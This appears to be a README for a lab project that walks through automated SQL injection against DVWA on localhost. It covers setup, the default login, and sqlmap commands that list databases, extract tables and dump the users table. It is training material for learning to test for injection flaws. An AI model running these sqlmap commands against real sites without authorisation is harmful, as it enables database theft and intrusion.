# 🔐 Automated SQL Injection Testing using SQLmap (DVWA)

## 📌 Project Overview
This project demonstrates how to detect and exploit SQL Injection vulnerabilities using SQLmap on DVWA (Damn Vulnerable Web Application).

## 🎯 Objectives
- Understand SQL Injection concepts
- Perform automated testing using SQLmap
- Extract database information
- Document vulnerabilities professionally

## 🛠️ Tools Used
- Kali Linux
- SQLmap
- DVWA
- MySQL

## ⚙️ Setup
1. Install DVWA in /var/www/html
2. Start Apache & MySQL:
   sudo systemctl start apache2
   sudo systemctl start mysql

   3. Open DVWA in browser:
http://localhost/DVWA
4. Login:
- Username: admin
- Password: password
5. Set security level to LOW

## 🧪 SQL Injection Testing

### Step 1: Identify Vulnerable URL
http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit

### Step 2: Run SQLmap
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit
" --cookie="PHPSESSID=YOUR_SESSION; security=low" --dbs --batch
### Step 3: Extract Tables
sqlmap -u "URL" --cookie="COOKIE" -D dvwa --tables

### Step 4: Dump Data
sqlmap -u "URL" --cookie="COOKIE" -D dvwa -T users --dump

## 📊 Results
- Database detected: dvwa
- Tables extracted: users, guestbook
- Sensitive data retrieved successfully

## ⚠️ Disclaimer
This project is for educational purposes only. Do not test without permission.

## 👨‍💻 Author
Tariq Ahmad
